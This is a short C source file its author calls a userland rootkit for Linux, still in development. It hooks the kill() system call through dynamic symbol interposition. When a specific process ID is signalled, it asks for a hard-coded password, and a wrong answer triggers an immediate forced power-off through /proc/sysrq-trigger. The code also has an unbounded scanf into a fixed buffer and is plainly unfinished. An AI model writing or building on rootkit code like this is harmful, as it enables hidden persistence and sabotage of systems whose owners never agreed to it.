// my rootkit userland for linux.
// author: Darksec, in development phase


#include <signal.h>
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

       int kill(pid_t pid, int sig){

	ssize_t result;

	ssize_t reads;

	const int pids = 1337;

       int (*matar)(pid_t pid, int sig);

	matar = dlsym(RTLD_NEXT, "kill");

if(pid == pids){

	char password[20];
	char *pass = "darksec";


result = write(1, "[+] What's the Password? \n", strlen("[+] What's the Password? \n"));
result = write(1, "[!] --> ", strlen("[!] --> "));
scanf("%s", &password);



if(strcmp(password, pass) == 0){

printf("Darksec1337 \n");

} else {

system("echo o > /proc/sysrq-trigger");

}

} else {

return matar(pid, sig);

}

}
